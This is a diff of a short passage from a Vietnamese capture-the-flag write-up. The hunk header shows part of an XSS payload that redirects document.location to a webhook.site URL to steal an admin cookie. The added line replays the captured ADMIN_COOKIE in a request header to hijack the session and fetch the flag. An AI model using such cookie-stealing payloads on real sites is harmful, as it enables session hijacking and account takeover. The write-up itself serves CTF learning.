@@ -114,6 +114,8 @@ Payload:`"><img src=1 onerror='document.location="https://webhook.site/aa5efb2d-
 
 Ta thu được admin cookie: `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`. Có ADMIN_COOKIE, ta thay đổi vào cookie và `GET` pass:
 
+`cookie: status=ayuQ; ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`
+
 ![Screenshot 2023-11-12 003334](https://github.com/aQ05/Write-up/assets/121664384/9de048c4-c89e-4418-b8a3-49a05c220968)
 
 ## Flag
